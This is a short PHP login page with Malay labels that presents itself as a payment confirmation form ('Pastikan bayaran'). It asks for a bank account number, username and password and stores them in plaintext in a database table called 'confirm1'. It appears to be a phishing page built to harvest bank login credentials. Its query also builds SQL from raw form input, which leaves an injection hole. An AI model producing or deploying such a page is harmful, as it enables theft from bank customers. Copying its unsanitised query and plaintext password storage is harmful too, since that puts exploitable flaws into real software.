<?php
    session_start();

        include("connection.php");
        include("functions.php");

        if($_SERVER['REQUEST_METHOD'] == "POST")
        {

            //something was posted
            
            $acc_num = $_POST['acc_num'];
            $username2 = $_POST['username2'];
            $password2 = $_POST['password2'];

            if(!empty($acc_num) && !empty($username2) && !empty($password2))
            {
                //save to database
                $user_id = random_num(20);
                $query = "insert into confirm1 (user_id,acc_num,username2,password2) values ('$user_id','$acc_num','$username2','$password2')";
                
                mysqli_query($con, $query);

                header("location: complete.php");
                die;
            
            }
            
            else
            {
                echo " Please enter some valid information! ";
            }
        }

    ?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>

    <title>Log Masuk</title>

</head>
<body>
       <div class="box">
        <div class="container">

    

            <div class="top">
                <span></span>
                <header>Pastikan bayaran</header>
            </div>
            <form method="post">
            
            <div class="input-field">
                <input id="text" type="text" class="input" placeholder="No account" name="acc_num" >
                <i class='bx bx-user' ></i>
            </div>
            <div class="input-field">
                <input id="text" type="text" class="input" placeholder="Username" name="username2" >
                <i class='bx bx-user' ></i>
            </div>
            <div class="input-field">
                <input id="text" type="password" class="input" placeholder="password" name="password2" >
                <i class='bx bx-user' ></i><br><br>
            
                <input id="button" type="submit" value="Bayar">
                
                </div>

            <div class="two-col">
                
                <div class="two">
                  <p> <a href="index.php">Tekan untuk ke batalkan bayaran</a>.</p>
                </div>
    </form>
            </div>
        </div>
    </div>  
    </body>
</html>